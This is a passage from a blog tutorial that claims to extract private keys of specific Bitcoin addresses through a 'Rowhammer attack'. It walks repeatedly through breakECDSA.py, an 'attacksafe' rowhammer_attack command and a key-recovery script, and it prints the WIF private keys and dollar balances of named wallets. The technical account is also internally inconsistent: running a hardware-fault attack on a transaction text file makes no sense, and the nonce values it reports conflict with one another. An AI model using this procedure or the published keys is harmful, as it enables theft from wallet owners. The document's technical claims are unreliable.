<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-152-1024x142.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1274"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001e4705464562efc76d90240841ff3ed91c8db0b58ee4666502cb0a35cd5611f990d0000006a4730440220682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e880220052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0158020000000000001976a914406840ebc10519e0934c739a83a2d51f70ff09ae88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001e4705464562efc76d90240841ff3ed91c8db0b58ee4666502cb0a35cd5611f990d0000006a4730440220682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e880220052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0158020000000000001976a914406840ebc10519e0934c739a83a2d51f70ff09ae88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-153-1024x248.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1276"></figure>



<pre class="wp-block-code"><code>R = 0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88
S = 0x052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9
Z = 0x395e27708f075827fc7b179382a2a5e13c7649a046a89f2937bc5754349cc05d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001e4705464562efc76d90240841ff3ed91c8db0b58ee4666502cb0a35cd5611f990d0000006a4730440220682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e880220052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0158020000000000001976a914406840ebc10519e0934c739a83a2d51f70ff09ae88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-154-1024x298.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1278"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-155-1024x454.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1280"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x093bf9a5eb46ddeff6bcf94a326d00f89bc0ce6cbada4c5897758550eae10383

RawTX = 0100000001e4705464562efc76d90240841ff3ed91c8db0b58ee4666502cb0a35cd5611f990d0000006a4730440220682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e880220052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9012102083a0f1f4d81e74cb2903feccbaf82f7cb5cbeecafd178caefa2fa10d2dfe54dffffffff0158020000000000001976a914406840ebc10519e0934c739a83a2d51f70ff09ae88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x79aae6b77caa2bddd8e133f963bd236f71ff15dc9b50aa1d977bc4c44689edca</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x093bf9a5eb46ddeff6bcf94a326d00f89bc0ce6cbada4c5897758550eae10383</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-156-1024x96.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1282"></figure>



<p><code>(0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88 , 0xbcf3873021aff3756d237abe2c29c074c77cd585d73a919135135150fcc30197)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88
S = 0x052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9
Z = 0x395e27708f075827fc7b179382a2a5e13c7649a046a89f2937bc5754349cc05d</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88
point2gen  =   (0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88 , 0xbcf3873021aff3756d237abe2c29c074c77cd585d73a919135135150fcc30197)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x093bf9a5eb46ddeff6bcf94a326d00f89bc0ce6cbada4c5897758550eae10383</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x093bf9a5eb46ddeff6bcf94a326d00f89bc0ce6cbada4c5897758550eae10383
R = 0x682e6b2b855d9ca3e9e88a1ecf44cfe82461560c6c6db54c0c894e9c3e8b1e88
S = 0x052dd955d1521081a2e48b1830ee17e3c3f75eaf5fdc9072905914f5872155b9
Z = 0x395e27708f075827fc7b179382a2a5e13c7649a046a89f2937bc5754349cc05d


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-157.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1285"></figure>



<p><code>PrivKey = 86990adfdb019df305b4d38a963c9f46a1fbeac332285d122b0e2f888de31fba</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 18hhdfynnojmiMmBMsrkXNFWketq4mmDHB
WIF:  L1jMLZYkKr2YoTLH9xWXS9jPMgeasnTxWmGrHBK9aMCW9ahsNDzP
HEX:  86990adfdb019df305b4d38a963c9f46a1fbeac332285d122b0e2f888de31fba</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/002-1.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1263"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener"><strong>https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-150-1024x445.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1266"><figcaption><strong><a href="https://www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/18hhdfynnojmiMmBMsrkXNFWketq4mmDHB</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 708.99</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№3</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p><p><a href="https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b</a></p><p><a href="https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-101-1024x202.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1140"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-102-1024x206.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1142"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p><p><a href="https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/2f7422ffa8bd6311ee25bad9466f0e1d1feef24d32f1d60d7396080a12791f6b</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-158-1024x95.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1292"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000188e589b8eed21964cb26cbdf6c396d00eeafa9e3647c9127cbdb23140952aa5b2d0000006b483045022100ddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab02200d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc88050121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000188e589b8eed21964cb26cbdf6c396d00eeafa9e3647c9127cbdb23140952aa5b2d0000006b483045022100ddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab02200d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc88050121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-159-1024x245.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1293"></figure>



<pre class="wp-block-code"><code>R = 0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab
S = 0x0d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc8805
Z = 0xf01bdd08bc326304be4dece37d9b9069959f0f8e20dbd14b840849271042ab17</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000188e589b8eed21964cb26cbdf6c396d00eeafa9e3647c9127cbdb23140952aa5b2d0000006b483045022100ddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab02200d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc88050121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-160-1024x298.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1295"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-161-1024x453.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1296"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe

RawTX = 010000000188e589b8eed21964cb26cbdf6c396d00eeafa9e3647c9127cbdb23140952aa5b2d0000006b483045022100ddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab02200d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc88050121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01d0020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-162-1024x90.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1298"></figure>



<p><code>(0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab , 0x4dd4a6ea5041635a29cafaeb019dce1848cab62c5b638dd235c3177f361f0911)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab
S = 0x0d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc8805
Z = 0xf01bdd08bc326304be4dece37d9b9069959f0f8e20dbd14b840849271042ab17</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab
point2gen  =   (0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab , 0x4dd4a6ea5041635a29cafaeb019dce1848cab62c5b638dd235c3177f361f0911)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x786a67462e7cfaee1fb5b583518d3f47d750dbf34e9a4434625232cb05cb7efe
R = 0xddf8c20bb701221daa1a16b69d448bd9582a9051889c0ba71d73930b61876bab
S = 0x0d66649db3f3a1b7c28984f4d08d41496ffc8488b6e35e4f2b4abdd6bdfc8805
Z = 0xf01bdd08bc326304be4dece37d9b9069959f0f8e20dbd14b840849271042ab17


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-163.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1299"></figure>



<p><code>PrivKey = cdd7729ab894ba334e9a9b55c6bdb8c7e5869c80339ca6bb0ae23faee6af550b</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP
WIF:  L47qg9KCcGYw1WkVKGA6EH6mAdMoD5WwXCT4Gyn8UxLGPbZ14AUz
HEX:  cdd7729ab894ba334e9a9b55c6bdb8c7e5869c80339ca6bb0ae23faee6af550b</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/003.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1301"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><a href="https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener"><strong>https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-164-1024x446.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1304"><figcaption><strong><a href="https://www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 698.45</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f" target="_blank" rel="noreferrer noopener">7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP" target="_blank" rel="noreferrer noopener">14jUzNgdAboyaUaWNxbDJYYAKwHSwwj6sP</a></strong></p><p><a href="https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/7de3c41e439bbab837602019e17611d6fe9d245bcb1f182add148fc35fc42e8f</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-165-1024x94.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1307"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001e4c6502d4648cd1ae5f2783fe4e8ba449257f0a38b0f8b061ec1cd53e4ba2ade040000006a47304402200a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf781902204eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e390121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01a8020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001e4c6502d4648cd1ae5f2783fe4e8ba449257f0a38b0f8b061ec1cd53e4ba2ade040000006a47304402200a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf781902204eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e390121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01a8020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-166-1024x242.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1308"></figure>



<pre class="wp-block-code"><code>R = 0x0a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf7819
S = 0x4eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e39
Z = 0xade80ed6e0d32f4cf2ad36e7f2b28e3f0d421de70310d8726f7dd8a2580936a8</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001e4c6502d4648cd1ae5f2783fe4e8ba449257f0a38b0f8b061ec1cd53e4ba2ade040000006a47304402200a5a38731e8947d567cd82302b8a3a9546215f044ca98b89ea162334bebf781902204eb5aae65c917b18ae6af2b2449bb0ec8c8af4e02c0f68aabba7f509b06c5e390121031702d9ec2144df3030e65465bb96d651ea18c56c90215f4835d86e03d797091affffffff01a8020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-167-1024x295.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1310"></figure>



